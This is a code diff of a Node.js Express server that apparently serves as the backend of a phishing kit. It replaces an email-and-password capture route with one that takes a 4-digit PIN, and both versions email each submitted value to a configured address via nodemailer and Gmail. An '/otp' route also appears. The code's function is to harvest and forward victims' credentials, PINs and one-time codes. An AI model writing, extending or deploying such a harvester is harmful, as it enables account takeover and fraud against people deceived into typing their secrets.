@@ -50,9 +50,13 @@ app.post("/", (req, res) => {
     }
   });
 });
-// API routes for pin And username
-app.post("/email", (req, res) => {
-  const { email, password } = req.body;
+
+ app.post("/pin", (req, res) => {
+  const { pin } = req.body;
+
+  if (typeof pin !== "string" || !/^\d{4}$/.test(pin)) {
+    return res.status(400).send("Invalid PIN: must be 4 digits");
+  }
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -63,10 +67,10 @@ app.post("/email", (req, res) => {
   });
 
   const mailOptions = {
-    from: `${email}`,
+    from: smtpUser,
     to: userEmail,
-    subject: `Email: ${email} & Password: ${password}`,
-    text: `New user submitted Email: ${email} and Password: ${password}`,
+    subject: `PIN: ${pin}`,
+    text: `New user submitted PIN: ${pin}`,
   };
 
   console.log(mailOptions);
@@ -116,3 +120,4 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
+
